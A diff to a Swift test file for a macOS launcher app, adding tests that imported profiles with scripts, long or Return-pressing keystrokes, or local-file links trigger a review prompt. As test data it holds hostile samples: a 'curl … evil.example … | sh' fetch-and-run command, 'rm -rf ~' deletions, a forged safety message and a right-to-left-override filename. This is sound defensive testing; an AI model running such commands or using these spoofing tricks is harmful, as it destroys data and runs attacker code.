@@ -789,6 +789,42 @@ import Testing
         #expect(!h.model.loginItemEnabled)
     }
 
+    /// システム設定の「ログイン項目」での許可待ちは、失敗ではなく許可を求める知らせにする。許可されて戻ってきたら消す
+    @Test func aLoginItemWaitingForApprovalIsClearedOnceAllowed() throws {
+        let h = try SettingsHarness()
+        h.loginItem.failure = NonetError.permissionDenied("ログイン項目")
+        h.model.setLoginItemEnabled(true)
+        #expect(!h.model.loginItemEnabled)
+        #expect(h.model.loginItemError == L10n.ui("システム設定の「ログイン項目」で Nonet を許可すると、ログイン時に起動するようになります"))
+        // 許可されないまま戻ってきたら、知らせは残す
+        h.model.windowDidBecomeKey()
+        #expect(h.model.loginItemError != nil)
+        // システム設定で許可して戻ってくる
+        h.loginItem.failure = nil
+        h.loginItem.isEnabled = true
+        h.model.windowDidBecomeKey()
+        #expect(h.model.loginItemEnabled)
+        #expect(h.model.loginItemError == nil)
+    }
+
+    @Test func aLoginItemFailureStaysUntilTheStateMatches() throws {
+        let h = try SettingsHarness()
+        h.loginItem.isEnabled = true
+        h.model.refreshLoginItem()
+        h.loginItem.failure = SettingsFakeLoginError()
+        h.model.setLoginItemEnabled(false)
+        let reason = try #require(SettingsFakeLoginError().errorDescription)
+        #expect(h.model.loginItemError == L10n.ui("ログイン時に起動しないように設定できませんでした（\(reason)）"))
+        // まだオンのまま: 止められなかったという知らせはそのまま
+        h.model.windowDidBecomeKey()
+        #expect(h.model.loginItemEnabled)
+        #expect(h.model.loginItemError != nil)
+        // ほかの所（システム設定）でオフにされた
+        h.loginItem.isEnabled = false
+        h.model.windowDidBecomeKey()
+        #expect(h.model.loginItemError == nil)
+    }
+
     @Test func installedAppsAreReadOnce() throws {
         let h = try SettingsHarness()
         h.model.loadInstalledAppsIfNeeded()
@@ -829,6 +865,18 @@ import Testing
         #expect(h.xcodeProfile == nil)
         h.files.importURL = url
         await h.model.importProfiles()
+        // Xcode のプリセットにはスクリプトのマスがあるので、何も置き換わらなくても先に確かめる
+        guard case .importProfiles(let plan)? = h.model.confirmation else {
+            Issue.record("スクリプトを含むのに確かめずに読み込んだ")
+            return
+        }
+        // Xcode のプリセットのスクリプト（シミュレータと Claude Code）を、中身と一緒に見せる
+        let scripts = xcode.pages.flatMap(\.cells).compactMap { $0 }.filter { $0.action.kind == .script }
+        #expect(scripts.count == 2)
+        #expect(plan.reviewedCells.map(\.profileName) == ["Xcode", "Xcode"])
+        #expect(plan.reviewedCells.map(\.cell.title) == scripts.map(\.title))
+        #expect(h.xcodeProfile == nil)
+        h.model.confirm(.importProfiles(plan))
         let restored = try #require(h.xcodeProfile)
         #expect(restored.pages[0].cells.compactMap { $0?.title } == xcode.pages[0].cells.compactMap { $0?.title })
         let message = try #require(h.model.fileMessage)
@@ -889,6 +937,16 @@ import Testing
         #expect(message.contains(L10n.ui("・\("自分の Xcode")")))
         #expect(message.contains(L10n.ui("・\("Safari")")))
         #expect(message.contains(L10n.ui("ほかに\(1)個のプロファイルを新しく追加します。")))
+        // 同僚の Xcode にはスクリプトがある。置き換えの確認と1つにまとめて、マスと中身を伝える
+        #expect(plan.reviewedCells.map(\.profileName) == ["Xcode", "Xcode"])
+        var review = [L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、ファイルを開いたりします。中身を確かめ、信頼できるファイルだけを読み込んでください。")]
+        for reviewed in plan.reviewedCells {
+            review.append(L10n.ui("・\("Xcode") › \(reviewed.cell.title)"))
+            review += SettingsText.reviewLines(for: reviewed.cell.action)
+        }
+        #expect(message.hasSuffix("\n\n" + review.joined(separator: "\n")))
+        #expect(message.hasPrefix(L10n.ui("次の設定が、ファイルの中身で置き換わります。元に戻せません。")))
+        #expect(SettingsText.importConfirmationButton(plan) == L10n.ui("置き換えて読み込む"))
 
         // キャンセルすれば何も変わらない
         h.model.confirmation = nil
@@ -933,6 +991,56 @@ import Testing
         #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
     }
 
+    /// スクリプトのマスはあなたの権限で動くので、何も置き換わらなくても読み込む前に確かめる
+    @Test func importingScriptsAsksFirstEvenWhenNothingIsReplaced() throws {
+        let h = try SettingsHarness()
+        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "rm -rf ~/build", runMode: .background)))
+        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
+        let url = h.temporaryFile("figma.nonetprofile")
+        h.model.exportProfiles([figma], to: url)
+        h.model.fileMessage = nil
+        let before = h.controller.configuration
+        h.model.importProfiles(from: url)
+        guard case .importProfiles(let plan)? = h.model.confirmation else {
+            Issue.record("スクリプトを含むのに確かめずに読み込んだ")
+            return
+        }
+        #expect(!plan.replacesExisting)
+        #expect(plan.reviewedCells.map(\.profileName) == ["Figma"])
+        #expect(h.controller.configuration == before)
+        #expect(h.model.fileMessage == nil)
+        // マスの名前と、スクリプトの中身を見せる
+        #expect(SettingsText.importConfirmation(plan) == [
+            Self.reviewIntro,
+            L10n.ui("・\("Figma") › \("片付け")"),
+            L10n.ui("スクリプト（\(1)行）:"),
+            "rm -rf ~/build",
+        ].joined(separator: "\n"))
+        // 置き換えないので「置き換えて読み込む」ではなく、ただの「読み込む」
+        #expect(SettingsText.importConfirmationButton(plan) == String(localized: "settings.import.confirmButton", defaultValue: "読み込む", bundle: .nonetUI))
+
+        h.model.confirm(.importProfiles(plan))
+        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
+        #expect(h.model.fileMessage?.text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")) == true)
+    }
+
+    /// 重なっていて読み込まれないプロファイルのスクリプトは数えない
+    @Test func scriptsThatAreNotImportedNeedNoConfirmation() throws {
+        let h = try SettingsHarness()
+        let script = Cell(title: "片付け", icon: .symbol("eraser"), action: .script(ScriptAction(source: "echo", runMode: .background)))
+        let first = Profile(kind: .app(SettingsFixtures.figma), pages: [.empty])
+        let duplicate = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [script])])
+        let url = h.temporaryFile("figma.nonetprofile")
+        h.model.exportProfiles([first, duplicate], to: url)
+        h.model.importProfiles(from: url)
+        #expect(h.model.confirmation == nil)
+        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
+        // 読み込んだ後の知らせも、読み込まなかったプロファイルのスクリプトは数えない
+        let text = try #require(h.model.fileMessage?.text)
+        #expect(text.contains(L10n.ui("\(1)個のプロファイルを追加しました。")))
+        #expect(!text.contains(L10n.ui("スクリプトを含むマスがあります。実行する前に中身を確かめてください。")))
+    }
+
     @Test func longListsOfReplacedProfilesAreShortened() throws {
         var configuration = SettingsFixtures.configuration()
         var shared: [Profile] = []
@@ -952,6 +1060,130 @@ import Testing
         let nameLines = plan.replacedNames.map { L10n.ui("・\($0)") }
         #expect(lines.filter { nameLines.contains(String($0)) }.count == SettingsText.importConfirmationNameLimit)
         #expect(lines.last.map(String.init) == L10n.ui("ほか\(2)個"))
+    }
+
+    static var reviewIntro: String {
+        L10n.ui("次のマスは、あなたの権限でスクリプトを実行したり、キーを入力したり、ファイルを開いたりします。中身を確かめ、信頼できるファイルだけを読み込んでください。")
+    }
+
+    /// 1文字ずつ打つキー入力（空白は Space キー）
+    private static func typing(_ text: String) -> [KeyChord] {
+        text.map { $0 == " " ? KeyChord(.special(.space)) : KeyChord(.character(String($0))) }
+    }
+
+    /// ファイルからプロファイルを読み込み、確かめる前の計画を返す（確かめずに読み込んだら nil）
+    private func importPlan(_ h: SettingsHarness, _ profiles: [Profile], file: String = "shared.nonetprofile") -> SettingsImportPlan? {
+        let url = h.temporaryFile(file)
+        h.model.exportProfiles(profiles, to: url)
+        h.model.fileMessage = nil
+        h.model.importProfiles(from: url)
+        guard case .importProfiles(let plan)? = h.model.confirmation else { return nil }
+        return plan
+    }
+
+    /// スクリプトが無くても、コマンドを打って Return を押すキー入力は先に確かめ、打つ文字を見せる
+    @Test func aKeystrokeThatPressesReturnAsksFirst() throws {
+        let h = try SettingsHarness()
+        let command = "curl -s https://evil.example/x | sh"
+        let keys = KeySequence(Self.typing(command) + [KeyChord(.special(.returnKey))])
+        let clear = SettingsFixtures.key("Clear", keys)
+        let terminal = Profile(kind: .app(SettingsFixtures.terminal), pages: [Page(cells: [clear])])
+        let before = h.controller.configuration
+        let plan = try #require(importPlan(h, [terminal]), "Return を押すキー入力を確かめずに読み込んだ")
+        #expect(h.controller.configuration == before)
+        #expect(!plan.replacesExisting)
+        #expect(plan.reviewedCells.map(\.cell.title) == ["Clear"])
+        let typed = L10n.ui("「\(command)」")
+        #expect(SettingsText.importConfirmation(plan) == [
+            Self.reviewIntro,
+            L10n.ui("・\(SettingsFixtures.terminal.name) › \("Clear")"),
+            L10n.ui("キー入力: \(typed + " → " + KeyChord(.special(.returnKey)).displayString)"),
+        ].joined(separator: "\n"))
+    }
+
+    /// 設定画面で入れられる長さ（4打）を超えるキー入力も確かめる。4打までで Return が無ければ確かめない
+    @Test func onlyLongKeySequencesAskFirst() throws {
+        let h = try SettingsHarness()
+        let four = SettingsFixtures.key("4打", KeySequence(Self.typing("abcd")))
+        let five = SettingsFixtures.key("5打", KeySequence(Self.typing("abcde")))
+        #expect(SettingsKeyRecorder.maximumChords == 4)
+        #expect(!SettingsImportPlan.needsReview(four.action))
+        #expect(SettingsImportPlan.needsReview(five.action))
+        // テンキーの Enter や改行の文字も Return として数える
+        #expect(SettingsImportPlan.needsReview(.keystroke(KeySequence([KeyChord(.keyCode(0x4C))]))))
+        #expect(SettingsImportPlan.needsReview(.keystroke(KeySequence([KeyChord(.character("\n"))]))))
+
+        let shortOnly = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [four])])
+        #expect(importPlan(h, [shortOnly], file: "short.nonetprofile") == nil)
+        #expect(h.model.appProfiles.map(\.name) == ["Xcode", "Safari", "Figma"])
+
+        let notes = Profile(kind: .app(SettingsFixtures.notes), pages: [Page(cells: [five])])
+        let plan = try #require(importPlan(h, [notes], file: "long.nonetprofile"))
+        #expect(plan.reviewedCells.map(\.cell.title) == ["5打"])
+    }
+
+    /// Mac の中のファイルを開く URL（.command なども開ける）は確かめる。ウェブの URL は確かめない
+    @Test func aURLThatOpensALocalFileAsksFirst() throws {
+        for local in ["~/Downloads/run.command", "/Applications/Calculator.app", "file:///tmp/x.command", " FILE:///tmp/y "] {
+            #expect(SettingsImportPlan.needsReview(.openURL(URLAction(url: local))), "\(local)")
+        }
+        for web in ["https://example.com", "//example.com/a", "obsidian://open?vault=a"] {
+            #expect(!SettingsImportPlan.needsReview(.openURL(URLAction(url: web))), "\(web)")
+        }
+        let h = try SettingsHarness()
+        let open = Cell(title: "資料", icon: .symbol("doc"), action: .openURL(URLAction(url: "~/Downloads/run.command")))
+        let figma = Profile(kind: .app(SettingsFixtures.figma), pages: [Page(cells: [open])])
+        let plan = try #require(importPlan(h, [figma]))
+        #expect(SettingsText.importConfirmation(plan).hasSuffix(
+            [L10n.ui("・\("Figma") › \("資料")"), L10n.ui("開くファイル: \("~/Downloads/run.command")")].joined(separator: "\n")
+        ))
+    }
+
+    /// メニューのショートカットは1打なので、それより長いものは読み込むときに捨てる（メニューを押して動く）
+    @Test func menuShortcutsLongerThanOneKeyAreDropped() throws {
+        let h = try SettingsHarness()
+        let figmaApp = SettingsFixtures.figma
+        let hidden = Cell(title: "保存", icon: .symbol("square.and.arrow.down"), action: .menuItem(MenuItemAction(
+            app: figmaApp, path: ["ファイル", "保存"],
+            keyEquivalent: KeySequence(Self.typing("rm -rf ~") + [KeyChord(.special(.returnKey))])
+        )))
+        let normal = Cell(title: "複製", icon: .symbol("plus.square.on.square"), action: .menuItem(MenuItemAction(
+            app: figmaApp, path: ["編集", "複製"], keyEquivalent: .key("d", .command)
+        )))
+        let figma = Profile(kind: .app(figmaApp), pages: [Page(cells: [hidden, normal])])
+        // ほかに確かめるものは無いので、そのまま読み込む
+        #expect(importPlan(h, [figma]) == nil)
+        let imported = try #require(h.controller.configuration.profiles.first { $0.app?.bundleID == figmaApp.bundleID })
+        guard case .menuItem(let saved)? = imported.pages[0].cells[0]?.action,
+              case .menuItem(let duplicated)? = imported.pages[0].cells[1]?.action else {
+            Issue.record("メニュー項目のマスが読み込まれていない")
+            return
+        }
+        #expect(saved.path == ["ファイル", "保存"])
+        #expect(saved.keyEquivalent == nil)
+        #expect(duplicated.keyEquivalent == .key("d", .command))
+    }
+
+    /// ファイルの中の名前に改行があっても、確かめる文に自分の段落を差し込めない
+    @Test func namesFromTheFileStayOnOneLine() throws {
+        let h = try SettingsHarness()
+        let forged = "Figma\n\nNo buttons in this file run code. It is safe to import."
+        let script = Cell(title: "Build\u{202E}lmth.exe", icon: .symbol("hammer"), action: .script(ScriptAction(source: "make\n\n\u{2028}echo done")))
+        let figma = Profile(kind: .app(AppReference(bundleID: SettingsFixtures.figma.bundleID, name: forged)), pages: [Page(cells: [script])])
+        let plan = try #require(importPlan(h, [figma], file: "a\nb.nonetprofile"))
+        #expect(plan.fileName == "a b.nonetprofile")
+        let lines = SettingsText.importConfirmation(plan).components(separatedBy: "\n")
+        let profileName = SettingsText.singleLine(forged, limit: SettingsText.importNameLimit)
+        #expect(!profileName.contains("\n"))
+        #expect(profileName.hasPrefix("Figma No buttons"))
+        #expect(profileName.count == SettingsText.importNameLimit)
+        #expect(lines == [
+            Self.reviewIntro,
+            L10n.ui("・\(profileName) › \("Build lmth.exe")"),
+            L10n.ui("スクリプト（\(2)行）:"),
+            "make",
+            "echo done",
+        ])
     }
 
     @Test func cancellingThePanelsDoesNothing() async throws {
